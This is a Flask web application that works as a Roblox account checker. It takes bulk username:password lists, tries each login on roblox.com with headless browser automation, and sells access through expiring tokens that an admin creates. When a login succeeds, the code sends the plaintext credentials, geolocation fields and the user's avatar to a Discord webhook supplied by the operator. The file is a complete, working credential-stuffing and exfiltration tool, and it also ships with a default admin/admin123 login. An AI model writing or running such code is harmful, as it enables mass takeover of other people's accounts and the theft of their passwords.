from flask import Flask, render_template, request, jsonify, session, redirect, url_for
from flask_cors import CORS
from functools import wraps
import asyncio
import json
import os
import uuid
import hashlib
import secrets
from datetime import datetime, timedelta
import subprocess
import sys
import requests
import re
import time
from io import BytesIO

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', secrets.token_hex(32))
CORS(app)

# ==============================
# PLAYWRIGHT SETUP
# ==============================
PLAYWRIGHT_READY = False
PLAYWRIGHT_ERROR = None

def check_and_install_playwright():
    global PLAYWRIGHT_READY, PLAYWRIGHT_ERROR
    try:
        import playwright
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "playwright"])

    try:
        from playwright.sync_api import sync_playwright
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            browser.close()
        PLAYWRIGHT_READY = True
    except Exception as e:
        PLAYWRIGHT_READY = False
        PLAYWRIGHT_ERROR = str(e)

check_and_install_playwright()
from playwright.async_api import async_playwright

# ==============================
# CONSTANTS
# ==============================
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

# Data directory
DATA_DIR = 'data'
TOKENS_FILE = os.path.join(DATA_DIR, 'tokens.json')
ADMIN_FILE = os.path.join(DATA_DIR, 'admin.json')
os.makedirs(DATA_DIR, exist_ok=True)

# ==============================
# HELPER FUNCTIONS
# ==============================
def get_ip_info(ip):
    """Fetch detailed IP geolocation data"""
    try:
        url = f"http://ip-api.com/json/{ip}"
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('status') != 'success':
                raise ValueError(data.get('message', 'ip-api lookup failed'))
            return {
                'ip_address': data.get('query', ip),
                'country': data.get('country', 'N/A'),
                'state': data.get('regionName', 'N/A'),
                'city': data.get('city', 'N/A'),
                'postal': data.get('zip', 'N/A'),
                'asn': data.get('as', 'N/A'),
                'organization': data.get('org', 'N/A')
            }
    except Exception as e:
        print(f"[GEO ERROR] {ip}: {e}")
    return {
        'ip_address': ip,
        'country': 'N/A',
        'state': 'N/A',
        'city': 'N/A',
        'postal': 'N/A',
        'asn': 'N/A',
        'organization': 'N/A'
    }

# ==============================
# TOKEN MANAGEMENT
# ==============================
def load_tokens():
    if os.path.exists(TOKENS_FILE):
        with open(TOKENS_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_tokens(tokens):
    with open(TOKENS_FILE, 'w') as f:
        json.dump(tokens, f, indent=2)

def generate_token(user_id, days_valid=1):
    tokens = load_tokens()
    token = secrets.token_urlsafe(32)
    expiry = (datetime.now() + timedelta(days=days_valid)).isoformat()
    
    tokens[token] = {
        'user_id': user_id,
        'created_at': datetime.now().isoformat(),
        'expires_at': expiry,
        'uses': 0,
        'max_checks': 100
    }
    save_tokens(tokens)
    return token

def validate_token(token):
    tokens = load_tokens()
    if token not in tokens:
        return None
    
    token_data = tokens[token]
    expiry = datetime.fromisoformat(token_data['expires_at'])
    
    if datetime.now() > expiry:
        del tokens[token]
        save_tokens(tokens)
        return None
    
    if token_data['uses'] >= token_data.get('max_checks', 100):
        return None
    
    return token_data

def update_token_usage(token):
    tokens = load_tokens()
    if token in tokens:
        tokens[token]['uses'] += 1
        save_tokens(tokens)

# ==============================
# ADMIN AUTH
# ==============================
def init_admin():
    DEFAULT_ADMIN = {
        'username': 'admin',
        'password': hashlib.sha256('admin123'.encode()).hexdigest()
    }
    if not os.path.exists(ADMIN_FILE):
        with open(ADMIN_FILE, 'w') as f:
            json.dump({'admin': DEFAULT_ADMIN}, f)

init_admin()

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('admin_logged_in'):
            return redirect(url_for('admin_login'))
        return f(*args, **kwargs)
    return decorated_function

def token_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        token = request.headers.get('Authorization') or request.cookies.get('user_token')
        if not token:
            return jsonify({'error': 'Token required'}), 401
        
        token_data = validate_token(token)
        if not token_data:
            return jsonify({'error': 'Invalid or expired token'}), 401
        
        request.user_token = token
        request.token_data = token_data
        return f(*args, **kwargs)
    return decorated_function

# ==============================
# ROBLOX API
# ==============================
class RobloxAPI:
    def get_user_id(self, username):
        try:
            resp = requests.post("https://users.roblox.com/v1/usernames/users", 
                                json={"usernames": [username]}, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                return data['data'][0]['id'] if data.get('data') else None
        except: pass
        return None

    def get_headshot(self, username):
        uid = self.get_user_id(username)
        if uid:
            resp = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={uid}&size=150x150&format=Png", timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                return data['data'][0]['imageUrl'] if data.get('data') else None
        return None

# ==============================
# DISCORD WEBHOOK
# ==============================
class DiscordWebhook:
    def __init__(self, webhook_url=None):
        self.webhook_url = webhook_url
        self.roblox = RobloxAPI()

    def _post_with_retry(self, payload, max_retries=3):
        for attempt in range(max_retries):
            try:
                response = requests.post(self.webhook_url, json=payload, timeout=10)
                if response.status_code != 429:
                    return response
                retry_after = 1.5
                try:
                    body = response.json()
                    retry_after = float(body.get('retry_after', retry_after))
                except Exception:
                    pass
                time.sleep(max(retry_after, 0.5))
            except Exception:
                if attempt == max_retries - 1:
                    raise
                time.sleep(1.0)
        return None

    def send(self, username, password, ip_data, status, message):
        if not self.webhook_url:
            return

        headshot = self.roblox.get_headshot(username)
        fields = [
            {"name": "Username", "value": f"```{username}```", "inline": True},
            {"name": "Password", "value": f"```{password}```", "inline": True},
            {"name": "IP Address", "value": f"```{ip_data.get('ip_address', 'N/A')}```", "inline": True},
            {"name": "Country", "value": ip_data.get('country', 'N/A'), "inline": True},
            {"name": "State", "value": ip_data.get('state', 'N/A'), "inline": True},
            {"name": "City", "value": ip_data.get('city', 'N/A'), "inline": True},
            {"name": "Check Result", "value": f"**{message}**", "inline": False}
        ]

        embed = {
            "title": "ACCOUNT FOUND - VALID" if status == 'VALID' else f"{status} ACCOUNT",
            "color": 0x00FF00 if status == 'VALID' else 0xFF0000,
            "fields": fields,
            "footer": {"text": f"ROBLOX CHECKER • {datetime.now().strftime('%H:%M:%S')}"}
        }
        if headshot:
            embed["thumbnail"] = {"url": headshot}

        try:
            self._post_with_retry({"embeds": [embed]})
        except:
            pass

# ==============================
# ACCOUNT PARSER
# ==============================
class AccountParser:
    @staticmethod
    def parse_raw(content):
        accounts = []
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')

        for line in content.split('\n'):
            line = line.strip()
            if ':' in line:
                username, password = line.split(':', 1)
                if username and password:
                    accounts.append((username.strip(), password.strip(), {}))
        return accounts

# ==============================
# ROBLOX CHECKER
# ==============================
class RobloxChecker:
    def __init__(self):
        self.url = "https://www.roblox.com/login"
        self.playwright = None
        self.browser = None
        self.context = None
        self.page = None

    async def start(self):
        if self.browser and self.browser.is_connected():
            if not self.page or self.page.is_closed():
                self.page = await self.context.new_page()
            return

        self.playwright = await async_playwright().start()
        self.browser = await self.playwright.chromium.launch(headless=True)
        self.context = await self.browser.new_context(user_agent=USER_AGENT)
        self.page = await self.context.new_page()

    async def close(self):
        if self.context:
            await self.context.close()
            self.context = None
        if self.browser and self.browser.is_connected():
            await self.browser.close()
            self.browser = None
        if self.playwright:
            await self.playwright.stop()
            self.playwright = None
        self.page = None

    async def check(self, username, password):
        try:
            await self.start()
            await self.page.goto(self.url, wait_until='load', timeout=60000)
            await self.page.wait_for_timeout(2000)

            await self.page.fill('input[type="text"]', username)
            await self.page.fill('input[type="password"]', password)
            await self.page.click('#login-button')

            await self.page.wait_for_timeout(5000)
            
            current_url = self.page.url.lower()
            content = await self.page.content()
            content_lower = content.lower()

            invalid_keywords = ['incorrect username or password', 'wrong username', 'invalid credentials']
            valid_keywords = ['home', 'users/', 'my/account', 'challenge', 'two-step']

            for keyword in invalid_keywords:
                if keyword in content_lower:
                    return {'status': 'INVALID', 'message': 'Wrong username/password'}

            for keyword in valid_keywords:
                if keyword in current_url or keyword in content_lower:
                    return {'status': 'VALID', 'message': 'Login successful'}

            return {'status': 'ERROR', 'message': 'Unknown response'}
        except Exception as e:
            return {'status': 'ERROR', 'message': f'{str(e)[:80]}'}

# ==============================
# NONTRUE CHECKER
# ==============================
class NonTrueChecker:
    def __init__(self, session_id=None):
        self.session_id = session_id or str(uuid.uuid4())[:8]
        self.temp_dir = f'nontrue_checker_session_{self.session_id}'
        self.checker = RobloxChecker()
        os.makedirs(self.temp_dir, exist_ok=True)

    async def check_bulk_nontrue(self, content, webhook_url=None):
        accounts = AccountParser.parse_raw(content)
        valid_count = 0
        invalid_count = 0
        error_count = 0
        results = []
        webhook = DiscordWebhook(webhook_url) if webhook_url else None

        try:
            await self.checker.start()
            
            for username, password, ip_data in accounts:
                result = await self.checker.check(username, password)
                status = result.get('status', 'ERROR')
                message = result.get('message', 'Unknown')

                if status == 'VALID':
                    valid_count += 1
                elif status == 'INVALID':
                    invalid_count += 1
                else:
                    error_count += 1

                results.append({
                    'status': status.lower(),
                    'username': username,
                    'password': password,
                    'message': message
                })

                if webhook and status == 'VALID':
                    geo_data = get_ip_info(ip_data.get('ip_address', 'N/A')) if ip_data else {}
                    webhook.send(username, password, geo_data, status, message)

        finally:
            await self.checker.close()

        return {
            'status': 'success',
            'results': results,
            'total': len(accounts),
            'valid': valid_count,
            'invalid': invalid_count,
            'error': error_count
        }

# ==============================
# FLASK ROUTES
# ==============================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login')
def login():
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

@app.route('/admin/login')
def admin_login():
    return render_template('admin_login.html')

@app.route('/admin/dashboard')
@admin_required
def admin_dashboard():
    return render_template('admin_dashboard.html')

# API Routes
@app.route('/api/admin/login', methods=['POST'])
def admin_auth():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    
    hashed_password = hashlib.sha256(password.encode()).hexdigest()
    
    with open(ADMIN_FILE, 'r') as f:
        admins = json.load(f)
    
    if username in admins and admins[username]['password'] == hashed_password:
        session['admin_logged_in'] = True
        session['admin_username'] = username
        return jsonify({'success': True, 'redirect': '/admin/dashboard'})
    
    return jsonify({'error': 'Invalid credentials'}), 401

@app.route('/api/admin/logout')
def admin_logout():
    session.clear()
    return jsonify({'success': True})

@app.route('/api/admin/tokens', methods=['GET'])
@admin_required
def get_tokens():
    tokens = load_tokens()
    token_list = []
    for token, data in tokens.items():
        token_list.append({
            'token': token[:16] + '...',
            'full_token': token,
            'user_id': data['user_id'],
            'created_at': data['created_at'],
            'expires_at': data['expires_at'],
            'uses': data['uses'],
            'max_checks': data.get('max_checks', 100)
        })
    return jsonify(token_list)

@app.route('/api/admin/tokens', methods=['POST'])
@admin_required
def create_token():
    data = request.json
    user_id = data.get('user_id', str(uuid.uuid4())[:8])
    days = data.get('days', 1)
    
    token = generate_token(user_id, days)
    return jsonify({
        'token': token,
        'user_id': user_id,
        'expires_in_days': days
    })

@app.route('/api/admin/tokens/<token>', methods=['DELETE'])
@admin_required
def delete_token(token):
    tokens = load_tokens()
    full_token = None
    for t in tokens:
        if t.startswith(token.replace('...', '')):
            full_token = t
            break
    
    if full_token and full_token in tokens:
        del tokens[full_token]
        save_tokens(tokens)
        return jsonify({'success': True})
    
    return jsonify({'error': 'Token not found'}), 404

@app.route('/api/validate-token', methods=['POST'])
def validate_user_token():
    data = request.json
    token = data.get('token')
    
    token_data = validate_token(token)
    if token_data:
        return jsonify({
            'valid': True,
            'user_id': token_data['user_id'],
            'expires_at': token_data['expires_at'],
            'remaining_checks': token_data.get('max_checks', 100) - token_data['uses']
        })
    
    return jsonify({'valid': False}), 401

@app.route('/api/check', methods=['POST'])
@token_required
def check_account():
    data = request.json
    accounts_input = data.get('accounts', '')
    webhook_url = data.get('webhook_url', '')
    
    if not accounts_input:
        return jsonify({'error': 'No accounts provided'}), 400
    
    update_token_usage(request.user_token)
    
    async def run_check():
        checker = NonTrueChecker(session_id=request.token_data['user_id'])
        return await checker.check_bulk_nontrue(accounts_input, webhook_url)
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result = loop.run_until_complete(run_check())
    loop.close()
    
    return jsonify(result)

@app.route('/api/check-single', methods=['POST'])
@token_required
def check_single_account():
    data = request.json
    username = data.get('username', '').strip()
    password = data.get('password', '').strip()
    
    if not username or not password:
        return jsonify({'error': 'Username and password required'}), 400
    
    update_token_usage(request.user_token)
    
    async def run_check():
        checker = RobloxChecker()
        await checker.start()
        result = await checker.check(username, password)
        await checker.close()
        return result
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result = loop.run_until_complete(run_check())
    loop.close()
    
    return jsonify({
        'username': username,
        'status': result.get('status', 'ERROR'),
        'message': result.get('message', 'Unknown')
    })

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
